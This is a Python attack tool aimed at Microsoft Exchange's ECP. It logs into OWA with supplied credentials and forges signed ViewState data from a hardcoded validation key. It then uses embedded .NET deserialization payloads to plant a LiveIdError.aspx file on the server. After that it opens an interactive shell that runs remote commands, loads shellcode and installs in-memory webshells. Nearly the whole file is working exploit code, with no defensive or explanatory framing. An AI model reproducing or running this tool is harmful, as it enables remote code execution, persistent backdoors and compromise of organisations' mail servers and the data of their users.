#!/usr/bin/env python
import requests
import argparse
import re
import sys
import os
import urllib3
from urllib.parse import urlparse
from urllib.parse import quote
from Crypto.Cipher import AES
from random import choice
import re
import base64
import struct
import hmac
import uuid
import cmd
from hashlib import sha1
urllib3.disable_warnings()


class GiveMeShell(cmd.Cmd):
	def __init__(self, base_url, domain, mode, timeout):
		self.base_url = base_url
		self.domain = domain
		self.mode = mode
		self.timeout = timeout
		cmd.Cmd.__init__(self)
		self.prompt = 'ExSHELL> '
		self.intro = '[+] Press help for extra shell commands'

	def do_help(self, line):
		print("""
	exec {cmd}                - executes a local shell cmd
	arch                      - get remote process architecture(for shellcode)
	shellcode {shellcode}     - run shellcode.bin
	memshell {payload}        - install memshell
	remove                    - delete /ecp/LiveIdError.aspx
	!{cmd}                    - executes a local shell cmd
	lcd {path}                - changes the current local directory to {path}
	exit                      - terminates the server process (and this session)
	""")
	def do_shell(self,cmd):
		os.system(cmd)

	def do_exec(self, s):
		exploit(self.base_url, s, None, None,self.domain, self.mode, self.timeout)

	def do_arch(self,s):
		exploit(self.base_url, None, None, None, self.domain, self.mode, self.timeout)

	def do_shellcode(self, s):
		exploit(self.base_url, None, s, None, self.domain, self.mode, self.timeout)

	def do_memshell(self,s):
		exploit(self.base_url, None, None, s, self.domain, self.mode, self.timeout)
	
	def do_remove(self,s):
		cmd = '''cmd.exe /c del /f /q "%ExchangeInstallPath%\ClientAccess\ecp\LiveIdError.aspx""'''
		exploit(self.base_url, cmd, None, None, self.domain, self.mode, self.timeout)
		if check_LiveId(self.base_url+"/ecp/LiveIdError.aspx"):
			print("[-] Remove failed ..")
			return False
		else:
			print("[+] Remove successfully! exit..")
			return True

	def do_lcd(self, s):
		if s == '':
			print(os.getcwd())
		else:
			os.chdir(s)

	def default(self, s):
		print("[-] Press help for extra shell commands")

	def do_exit(self, line):
		remove = input("[*] Do u want to remove page ecp/LiveIdError.aspx ? y/n:")
		if remove.lower() == "y":
			self.do_remove(line)
		return True


def owa_login(login_url, user, pwd, timeout):
	print("[*] Tring to login owa...")
	# paramsPost = {"password": ""+pwd+"", "isUtf8": "1", "passwordText": "", "trusted": "4",
	# 			"destination": ""+url+"", "flags": "4", "forcedownlevel": "0", "username": ""+user+""}
	paramsPost = '''password={}&isUtf8=1&passwordText=&trusted=4&destination={}&flags=4&forcedownlevel=0&username={}'''.format(
			pwd, login_url.replace('auth.owa', ''), user)
	headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Upgrade-Insecure-Requests": "1",
			"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:73.0) Gecko/20100101 Firefox/73.0", "Connection": "close", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded"}
	cookies = {"PBack": "0", "PrivateComputer": "true"}
	print("[+] Login url: {}".format(login_url))
	try:
		login = session.post(login_url, data=paramsPost,
					   headers=headers, verify=False, cookies=cookies, timeout=timeout)
		print("[*] Status code: {}".format(login.status_code))
		if "reason=" in login.text:
			print("[!] Login Incorrect, please try again with a different account..")
			return False
		#print(str(response.text))
	except Exception as e:
		print("[!] login error , error: {}".format(e))
		return False
	print("[+] Login successfully! ")
	return True


def buildnumber_to_version(BuildNumber):
	#Reference:https://docs.microsoft.com/en-us/Exchange/new-features/build-numbers-and-release-dates?redirectedfrom=MSDN&view=exchserver-2019
	strlist = BuildNumber.split('.')
	return strlist[0]


def get_owa_version(url):
	try:
		r = requests.get(url, verify=False)
		nPos1 = r.text.index('href="')
		str1 = r.text[nPos1+9:nPos1+40]
		nPos2 = str1.index('/')
		nPos3 = str1.index('/themes/')
		str2 = str1[nPos2:nPos3]
		nPos4 = str2.rindex('/')
		BuildNumber = str2[nPos4+1:]
		print('[+] Get build number: {}'.format(BuildNumber))
		result = buildnumber_to_version(BuildNumber)
	except Exception as e:
		print('[!] Error in get exchagne version, exit.. error is :%s' % e)
		return False

	return result


def check_LiveId(url):
	req = session.get(url, verify=False, timeout=20, allow_redirects=False)
	if req.status_code == 200:
		return True
	# else:
	# 	print(req.status_code)
	# 	print(req.text)
	return False


def hash_hmac(key, code, sha1):
	hmac_code = hmac.new(key, code, sha1)
	return hmac_code.hexdigest()


def CreateViewState(data, key):
	try:
		MACKEY = UpdateMacKey(key)
		FORMAT_MARKER = b"\xff"
		VERSION_MARKER = b"\x01"
		TYPECODE = b'\x32'
		buf = FORMAT_MARKER + VERSION_MARKER + TYPECODE
		num = len(data)
		while num >= 0x80:
			buf += struct.pack("<H", (num | 0x80))[:1]
			num = num >> 0x07
		buf += struct.pack("<H", num)[:1]
		buf += data[0:len(data)]
		out_data = buf
		buf += MACKEY
		validationKey = b'\xcb\x27\x21\xab\xda\xf8\xe9\xdc\x51\x6d\x62\x1d\x8b\x8b\xf1\x3a\x2c\x9e\x86\x89\xa2\x53\x03\xbf'
		hash_data = hmac.new(validationKey, buf, sha1).digest()
		out_data += hash_data[0:len(hash_data)]
	except Exception as e:
		out_data = None
	return base64.b64encode(out_data)


def UpdateMacKey(key):
	try:
		buf = bytes.fromhex(key)[::-1]
	except Exception as e:
		buf = None
	return buf


def create_live_page(livePage, version, base_url, domain, timeout):
	VIEWSTATEGENERATOR = ""
	endpoint = ['/ecp/default.aspx?__VIEWSTATEGENERATOR=B97B4E27', '/ecp/PersonalSettings/HomePage.aspx?showhelp=false&__VIEWSTATEGENERATOR=1D01FD4E', '/ecp/PersonalSettings/HomePage.aspx?showhelp=false&__VIEWSTATEGENERATOR=1D01FD4E', '/ecp/Organize/AutomaticReplies.slab?showhelp=false&__VIEWSTATEGENERATOR=FD338EE0', '/ecp/RulesEditor/InboxRules.slab?showhelp=false&__VIEWSTATEGENERATOR=FD338EE0', '/ecp/Organize/DeliveryReports.slab?showhelp=false&__VIEWSTATEGENERATOR=FD338EE0', '/ecp/MyGroups/PersonalGroups.aspx?showhelp=false&__VIEWSTATEGENERATOR=A767F62B', '/ecp/MyGroups/ViewDistributionGroup.aspx?pwmcid=1&id=38f4bec5-704f-4272-a654-95d53150e2ae&ReturnObjectType=1&__VIEWSTATEGENERATOR=321473B8', '/ecp/Customize/Messaging.aspx?showhelp=false&__VIEWSTATEGENERATOR=9C5731F0',
				'/ecp/Customize/General.aspx?showhelp=false&__VIEWSTATEGENERATOR=72B13321', '/ecp/Customize/Calendar.aspx?showhelp=false&__VIEWSTATEGENERATOR=4AD51055', '/ecp/Customize/SentItems.aspx?showhelp=false& __VIEWSTATEGENERATOR=4466B13F', '/ecp/PersonalSettings/Password.aspx?showhelp=false&__VIEWSTATEGENERATOR=59543DCA', '/ecp/SMS/TextMessaging.slab?showhelp=false&__VIEWSTATEGENERATOR=FD338EE0', '/ecp/TroubleShooting/MobileDevices.slab?showhelp=false&__VIEWSTATEGENERATOR=FD338EE0', '/ecp/Customize/Regional.aspx?showhelp=false&__VIEWSTATEGENERATOR=9097CD08', '/ecp/MyGroups/SearchAllGroups.slab?pwmcid=3&ReturnObjectType=1__VIEWSTATEGENERATOR=FD338EE0', '/ecp/Security/BlockOrAllow.aspx?showhelp=false&__VIEWSTATEGENERATOR=362253EF']
	times = 0
	while True:
		exp_url = "{}{}".format(base_url, choice(endpoint))
		status = session.get(exp_url, verify=False, timeout=timeout)
		if status.status_code == 200 or times > len(endpoint):
			pattern = re.compile('__VIEWSTATEGENERATOR=(.+)')
			result = pattern.search(exp_url)
			if result:
				VIEWSTATEGENERATOR = result[1]
			break
		times += 1
	if len(VIEWSTATEGENERATOR) < 1:
		print("[!] Get endpoint error, exit...")
		return False
	try:
		print("[*] Using endpoint: {}".format(exp_url))
		if check_LiveId(livePage):
			print("[+] Already have this page! exit..")
			return True
		print("[*] Start to create LiveIdError.aspx..")
		if int(version) < 15:
			#from EazyLov3
			out_payload = '''AAEAAAD/////AQAAAAAAAAAEAQAAADJTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5MaXN0YDFbW1N5c3RlbS5PYmplY3RdXQIAAAAGX2l0ZW1zBV9zaXplBQAICQIAAAACAAAAEAIAAAAEAAAACQMAAAAJBAAAAA0CDAUAAAAeU3lzdGVtLldvcmtmbG93LkNvbXBvbmVudE1vZGVsBQMAAABqU3lzdGVtLldvcmtmbG93LkNvbXBvbmVudE1vZGVsLlNlcmlhbGl6YXRpb24uQWN0aXZpdHlTdXJyb2dhdGVTZWxlY3RvcitPYmplY3RTdXJyb2dhdGUrT2JqZWN0U2VyaWFsaXplZFJlZgIAAAAEdHlwZQttZW1iZXJEYXRhcwMFAXgFAAAACQYAAAAJBwAAAAwIAAAABlN5c3RlbQUEAAAANVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLlRyZWVTZXRgMVtbU3lzdGVtLlN0cmluZ11dBAAAAAVDb3VudAhDb21wYXJlcgdWZXJzaW9uBUl0ZW1zAAQABggBeAUAAAAICAAAAAIAAAAJAwAAAAEAAAAJCgAAAAQGAAAAH1N5c3RlbS5Vbml0eVNlcmlhbGl6YXRpb25Ib2xkZXIDAAAABERhdGEJVW5pdHlUeXBlDEFzc2VtYmx5TmFtZQEAAQgGCwAAAC9TeXN0ZW0uQXJyYXkrRnVuY3RvckNvbXBhcmVyYDFbW1N5c3RlbS5TdHJpbmddXQQAAAAGDAAAAAhtc2NvcmxpYhAHAAAAAgAAAAkNAAAACQ4AAAARCgAAAAIAAAAGDwAAAAAGEAAAAFBDOlxQcm9ncmFtIEZpbGVzXE1pY3Jvc29mdFxFeGNoYW5nZSBTZXJ2ZXJcVjE0XENsaWVudEFjY2Vzc1xlY3BcTGl2ZUlkRXJyb3IuYXNweAQNAAAAIlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIDAAAACERlbGVnYXRlAAF4AQEBCREAAAANAA0ABA4AAAA9U3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuR2VuZXJpY0NvbXBhcmVyYDFbW1N5c3RlbS5TdHJpbmddXQAAAAAEEQAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50cnkHAAAABHR5cGUIYXNzZW1ibHkAEnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRUeXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQEBAQEBBhQAAABEU3lzdGVtLkFjdGlvbmAyW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYl0sW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliXV0GFQAAAE5TeXN0ZW0uQ29yZSwgVmVyc2lvbj0zLjUuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkNAAkMAAAABhcAAAAOU3lzdGVtLklPLkZpbGUGGAAAAAxXcml0ZUFsbFRleHQJGQAAAAQSAAAAAXgGAAAAAAAAAAAAAQEBAQABCA0ADQANAA0AAAAAAA0AARMAAAASAAAABh4AAAAHQ29tcGFyZQ0ABiAAAAANU3lzdGVtLlN0cmluZw0ACAAAAAoBGQAAABEAAAAGIgAAACRTeXN0ZW0uQ29tcGFyaXNvbmAxW1tTeXN0ZW0uU3RyaW5nXV0JDAAAAA0ACQwAAAAJIAAAAAkeAAAACw=='''
		else:
			#from zcgonvh
			out_payload = '''AAEAAAD/////AQAAAAAAAAAMAgAAAF5NaWNyb3NvZnQuUG93ZXJTaGVsbC5FZGl0b3IsIFZlcnNpb249My4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1BQEAAABCTWljcm9zb2Z0LlZpc3VhbFN0dWRpby5UZXh0LkZvcm1hdHRpbmcuVGV4dEZvcm1hdHRpbmdSdW5Qcm9wZXJ0aWVzAQAAAA9Gb3JlZ3JvdW5kQnJ1c2gBAgAAAAYDAAAAogg8UmVzb3VyY2VEaWN0aW9uYXJ5IHhtbG5zPSJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dpbmZ4LzIwMDYveGFtbC9wcmVzZW50YXRpb24iIHhtbG5zOng9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sIiB4bWxuczpzPSJjbHItbmFtZXNwYWNlOlN5c3RlbTthc3NlbWJseT1tc2NvcmxpYiIgeG1sbnM6dz0iY2xyLW5hbWVzcGFjZTpTeXN0ZW0uV2ViO2Fzc2VtYmx5PVN5c3RlbS5XZWIiPjxzOlN0cmluZyB4OktleT0iYSIgeDpGYWN0b3J5TWV0aG9kPSJzOkVudmlyb25tZW50LkdldEVudmlyb25tZW50VmFyaWFibGUiIHg6QXJndW1lbnRzPSJFeGNoYW5nZUluc3RhbGxQYXRoIi8+PHM6U3RyaW5nIHg6S2V5PSJiIiB4OkZhY3RvcnlNZXRob2Q9IkNvbmNhdCI+PHg6QXJndW1lbnRzPjxTdGF0aWNSZXNvdXJjZSBSZXNvdXJjZUtleT0iYSIvPjxzOlN0cmluZz5cQ2xpZW50QWNjZXNzXGVjcFxMaXZlSWRFcnJvci5hc3B4PC9zOlN0cmluZz48L3g6QXJndW1lbnRzPjwvczpTdHJpbmc+PE9iamVjdERhdGFQcm92aWRlciB4OktleT0ieCIgT2JqZWN0VHlwZT0ie3g6VHlwZSBzOklPLkZpbGV9IiBNZXRob2ROYW1lPSJBcHBlbmRBbGxUZXh0Ij48T2JqZWN0RGF0YVByb3ZpZGVyLk1ldGhvZFBhcmFtZXRlcnM+PFN0YXRpY1Jlc291cmNlIFJlc291cmNlS2V5PSJiIi8+PHM6U3RyaW5nPjwvczpTdHJpbmc+PC9PYmplY3REYXRhUHJvdmlkZXIuTWV0aG9kUGFyYW1ldGVycz48L09iamVjdERhdGFQcm92aWRlcj48T2JqZWN0RGF0YVByb3ZpZGVyIHg6S2V5PSJjIiBPYmplY3RJbnN0YW5jZT0ie3g6U3RhdGljIHc6SHR0cENvbnRleHQuQ3VycmVudH0iIE1ldGhvZE5hbWU9IiIvPjxPYmplY3REYXRhUHJvdmlkZXIgeDpLZXk9ImQiIE9iamVjdEluc3RhbmNlPSJ7U3RhdGljUmVzb3VyY2UgY30iIE1ldGhvZE5hbWU9ImdldF9SZXNwb25zZSIvPjxPYmplY3REYXRhUHJvdmlkZXIgeDpLZXk9ImUiIE9iamVjdEluc3RhbmNlPSJ7U3RhdGljUmVzb3VyY2UgZH0iIE1ldGhvZE5hbWU9IkVuZCIvPjwvUmVzb3VyY2VEaWN0aW9uYXJ5Pgs='''
		viewstate = CreateViewState(
			base64.b64decode(out_payload), VIEWSTATEGENERATOR)
		final_exp = "{}&__VIEWSTATE={}".format(exp_url, quote(viewstate))
		print("[*] Reset cookie ASP.NET_SessionId to null")
		session.cookies.set("ASP.NET_SessionId", "", domain=domain, path="/")
		status = session.get(final_exp, verify=False, timeout=timeout)
		if check_LiveId(livePage):
			print("[+] Successfully create this page! :)")
			return True
	except Exception as e:
		pass
	print("[-] Failed to create. :(")
	return False


def pkcs7padding(data):
	bs = 16
	padding = bs - len(data) % bs
	padding_text = chr(padding) * padding
	return data + padding_text.encode()


def pkcs7unpadding(data):
	lengt = len(data)
	unpadding = ord(data[lengt - 1])
	return data[0:lengt-unpadding]


def ENC(data):
	data = pkcs7padding(data)
	iv = uuid.uuid4().bytes
	k = uuid.uuid4().bytes
	aes = AES.new(k, AES.MODE_CBC, iv)
	cipher_text = aes.encrypt(data)
	return iv+k+cipher_text


def DEC(endata):
	iv = endata[:0x10]
	k = endata[0x10:0x20]
	aes_decrypter = AES.new(k, AES.MODE_CBC, iv)
	# aes_decrypter.block_size = 128
	# aes_decrypter.key_size = 128
	pad_text = aes_decrypter.decrypt(endata[0x20:])
	result = pkcs7unpadding(pad_text.decode('utf-8'))
	return result

def case(exp_type, cmd):
	result = b''
	if exp_type =='cmd':
		prefix = b'\x02'
		cmd_list = cmd.split(" ")
		command_len = len(cmd_list)
		if command_len >= 2:
			begin = cmd_list[0]
			after = " ".join(cmd_list[1:])
			buf = struct.pack("<H", len(begin))[:1] + begin.encode(
						'utf-8') + struct.pack("<H", len(after))[:1] + after.encode('utf-8')
		else:
			buf = struct.pack("<H", len(cmd_list[0]))[:1] + cmd_list[0].encode('utf-8') + b'\x00'
		result = prefix + buf
	elif exp_type =='shellcode':
		if not os.path.exists(cmd):
			print("[!] File not found")
			return ""
		shellcode = open(cmd, 'rb').read()
		prefix = b'\x01'
		result = prefix + shellcode
	elif exp_type == 'memshell':
		if not os.path.exists(cmd):
			print("[!] File not found")
			return ""
		mempaload = open(cmd, 'rb').read()
		result = mempaload
	else:
		prefix = b'\x00'
		result = prefix
	return result

def exploit(base_url, cmd, shellcode, memshell, domain, mode, timeout):
	if cmd:
		exp_type = "cmd"
		pass_cmd = cmd
	elif shellcode:
		exp_type = "shellcode"
		pass_cmd = shellcode
	elif memshell:
		exp_type = "memshell"
		pass_cmd = memshell
	else:
		exp_type = "arch"
		pass_cmd = None
	try:
		exp_url = "{}/ecp/LiveIdError.aspx".format(base_url)

		if mode:
			print("[*] fx4.8 mode, call ysoserial!ActivitySurrogateDisableTypeCheck")
			payload_48 = '''/wEyrA8AAQAAAP////8BAAAAAAAAAAwCAAAAXk1pY3Jvc29mdC5Qb3dlclNoZWxsLkVkaXRvciwgVmVyc2lvbj0zLjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPTMxYmYzODU2YWQzNjRlMzUFAQAAAEJNaWNyb3NvZnQuVmlzdWFsU3R1ZGlvLlRleHQuRm9ybWF0dGluZy5UZXh0Rm9ybWF0dGluZ1J1blByb3BlcnRpZXMBAAAAD0ZvcmVncm91bmRCcnVzaAECAAAABgMAAADODTxSZXNvdXJjZURpY3Rpb25hcnkKeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sL3ByZXNlbnRhdGlvbiIKeG1sbnM6eD0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwiCnhtbG5zOnM9ImNsci1uYW1lc3BhY2U6U3lzdGVtO2Fzc2VtYmx5PW1zY29ybGliIgp4bWxuczpjPSJjbHItbmFtZXNwYWNlOlN5c3RlbS5Db25maWd1cmF0aW9uO2Fzc2VtYmx5PVN5c3RlbS5Db25maWd1cmF0aW9uIgp4bWxuczpyPSJjbHItbmFtZXNwYWNlOlN5c3RlbS5SZWZsZWN0aW9uO2Fzc2VtYmx5PW1zY29ybGliIj4KICAgIDxPYmplY3REYXRhUHJvdmlkZXIgeDpLZXk9InR5cGUiIE9iamVjdFR5cGU9Int4OlR5cGUgczpUeXBlfSIgTWV0aG9kTmFtZT0iR2V0VHlwZSI+CiAgICAgICAgPE9iamVjdERhdGFQcm92aWRlci5NZXRob2RQYXJhbWV0ZXJzPgogICAgICAgICAgICA8czpTdHJpbmc+U3lzdGVtLldvcmtmbG93LkNvbXBvbmVudE1vZGVsLkFwcFNldHRpbmdzLCBTeXN0ZW0uV29ya2Zsb3cuQ29tcG9uZW50TW9kZWwsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1PC9zOlN0cmluZz4KICAgICAgICA8L09iamVjdERhdGFQcm92aWRlci5NZXRob2RQYXJhbWV0ZXJzPgogICAgPC9PYmplY3REYXRhUHJvdmlkZXI+CiAgICA8T2JqZWN0RGF0YVByb3ZpZGVyIHg6S2V5PSJmaWVsZCIgT2JqZWN0SW5zdGFuY2U9IntTdGF0aWNSZXNvdXJjZSB0eXBlfSIgTWV0aG9kTmFtZT0iR2V0RmllbGQiPgogICAgICAgIDxPYmplY3REYXRhUHJvdmlkZXIuTWV0aG9kUGFyYW1ldGVycz4KICAgICAgICAgICAgPHM6U3RyaW5nPmRpc2FibGVBY3Rpdml0eVN1cnJvZ2F0ZVNlbGVjdG9yVHlwZUNoZWNrPC9zOlN0cmluZz4KICAgICAgICAgICAgPHI6QmluZGluZ0ZsYWdzPjQwPC9yOkJpbmRpbmdGbGFncz4KICAgICAgICA8L09iamVjdERhdGFQcm92aWRlci5NZXRob2RQYXJhbWV0ZXJzPgogICAgPC9PYmplY3REYXRhUHJvdmlkZXI+CiAgICA8T2JqZWN0RGF0YVByb3ZpZGVyIHg6S2V5PSJzZXQiIE9iamVjdEluc3RhbmNlPSJ7U3RhdGljUmVzb3VyY2UgZmllbGR9IiBNZXRob2ROYW1lPSJTZXRWYWx1ZSI+CiAgICAgICAgPE9iamVjdERhdGFQcm92aWRlci5NZXRob2RQYXJhbWV0ZXJzPgogICAgICAgICAgICA8czpPYmplY3QvPgogICAgICAgICAgICA8czpCb29sZWFuPnRydWU8L3M6Qm9vbGVhbj4KICAgICAgICA8L09iamVjdERhdGFQcm92aWRlci5NZXRob2RQYXJhbWV0ZXJzPgogICAgPC9PYmplY3REYXRhUHJvdmlkZXI+CiAgICA8T2JqZWN0RGF0YVByb3ZpZGVyIHg6S2V5PSJzZXRNZXRob2QiIE9iamVjdEluc3RhbmNlPSJ7eDpTdGF0aWMgYzpDb25maWd1cmF0aW9uTWFuYWdlci5BcHBTZXR0aW5nc30iIE1ldGhvZE5hbWUgPSJTZXQiPgogICAgICAgIDxPYmplY3REYXRhUHJvdmlkZXIuTWV0aG9kUGFyYW1ldGVycz4KICAgICAgICAgICAgPHM6U3RyaW5nPm1pY3Jvc29mdDpXb3JrZmxvd0NvbXBvbmVudE1vZGVsOkRpc2FibGVBY3Rpdml0eVN1cnJvZ2F0ZVNlbGVjdG9yVHlwZUNoZWNrPC9zOlN0cmluZz4KICAgICAgICAgICAgPHM6U3RyaW5nPnRydWU8L3M6U3RyaW5nPgogICAgICAgIDwvT2JqZWN0RGF0YVByb3ZpZGVyLk1ldGhvZFBhcmFtZXRlcnM+CiAgICA8L09iamVjdERhdGFQcm92aWRlcj4KPC9SZXNvdXJjZURpY3Rpb25hcnk+C0TRVG6tEsVHoRGEZk2/1/mvImf7'''
			exp_post = "__VIEWSTATE={}&__VIEWSTATEGENERATOR={}".format(
							quote(payload_48), "31563A0D")
			session.cookies.set("ASP.NET_SessionId", "", domain=domain, path="/")
			headers = {"Content-Type": "application/x-www-form-urlencoded"}
			exp_resp = session.post(exp_url, data=exp_post, headers=headers,
							verify=False, timeout=timeout)

		
		#from zcgonvh
		exp_payload = ''''''
		case_cmd = case(exp_type, pass_cmd)
		if len(case_cmd) < 1:
			return
		if memshell:
			shell_data = case_cmd
			exp_post = "__VIEWSTATE={}&__VIEWSTATEGENERATOR={}".format(
								quote(CreateViewState(base64.b64decode(shell_data),"31563A0D")), "31563A0D")
			session.cookies.set("ASP.NET_SessionId", "", domain=domain, path="/")
			headers = {"Content-Type": "application/x-www-form-urlencoded"}
			exp_resp = session.post(exp_url, data=exp_post, headers=headers,
							verify=False, timeout=timeout)
			print("[*] Done, Pls checking shell yourself.")		
			return
		command = quote(base64.b64encode(ENC(case_cmd)))
		exp_post = "__VIEWSTATE={}&__VIEWSTATEGENERATOR={}&__SCROLLPOSITION={}".format(
			quote(exp_payload), "31563A0D", command)
		session.cookies.set("ASP.NET_SessionId", "", domain=domain, path="/")
		headers = {"Content-Type": "application/x-www-form-urlencoded"}
		exp_resp = session.post(exp_url, data=exp_post, headers=headers,
						  verify=False, timeout=timeout)
		pattern = re.compile(b'value=\"/wEPDwUKLTcyODc4(.+)\"')
		result = pattern.search(exp_resp.content)
		if result:
			print(DEC(base64.b64decode(result[1])))
		else:
			print("[!] Bad result! :(")
	except Exception as e:
		print(e)
		pass


def main():
	parser = argparse.ArgumentParser()
	parser.add_argument("-s", "--server", required=True,
					 help="ECP Server URL Example: http://ip/owa")
	parser.add_argument("-u", "--user", required=True,
					 help="Login account Example: domain\\user")
	parser.add_argument("-p", "--password", required=True, help="Password")
	parser.add_argument("-v48", action="store_true", help="If the target have .Net 4.8")
	parser.add_argument(
		"-t", "--timeout", help="Timeout", default='30')
	# parser.add_argument(
	# 	"-c", "--command", help="Command to Execute", default='whoami', required=True)
	args = parser.parse_args()
	url = args.server
	tmp = urlparse(url)
	domain = tmp.netloc
	base_url = "{}://{}".format(tmp.scheme, tmp.netloc)
	livePage = base_url+"/ecp/LiveIdError.aspx"
	login_url = base_url + '/owa/auth.owa'
	user = args.user
	pwd = args.password
	mode = args.v48
	timeout = int(args.timeout)
	print("[*] Checking exchange version.")
	version = get_owa_version(login_url)
	if not version:
		print("[!] Get exchange version failed, exit..")
		return
	if not owa_login(login_url, user, pwd, timeout):
		return
	if not create_live_page(livePage, version, base_url, domain, timeout):
		print("[!] Exploit failed, exit..")
		return
	print("[*] Init shell...")
	shell = GiveMeShell(base_url, domain, mode, timeout)
	shell.cmdloop()
	

session = requests.Session()
if __name__ == "__main__":
	main()
